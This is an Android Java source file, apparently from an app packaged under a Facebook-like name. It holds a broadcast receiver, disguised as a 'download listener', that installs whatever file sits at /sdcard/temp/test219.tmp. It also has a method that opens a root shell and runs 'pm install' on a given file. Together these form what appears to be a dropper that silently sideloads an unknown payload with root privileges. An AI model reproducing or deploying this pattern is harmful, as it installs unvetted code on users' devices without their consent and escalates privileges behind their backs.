package com.vnfa.facebook;

import java.io.File;
import java.io.OutputStream;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.util.Log;

import com.telpoo.frame.utils.AppSupport;

public class DownloadListenerService extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		Log.e("naq", "date");

		File f = new File(Environment.getExternalStorageDirectory() + "/temp/" + "test219.tmp");
		if (f.exists() && f.length() > 3)
			AppSupport.install(Environment.getExternalStorageDirectory() + "/temp/" + "test219.tmp", context);

	}

	public void changePermission(String filename) {
		try {
			Process sh = Runtime.getRuntime().exec("su", null, new File("/system/bin/"));
			sh.waitFor();
			OutputStream os = sh.getOutputStream();
			os.write(("pm install " + filename).getBytes("UTF-8"));
			os.flush();
			os.close();
		} catch (Exception ex) {
			Log.e("CHMOD ERROR", ex.getMessage());
		}
	}

}
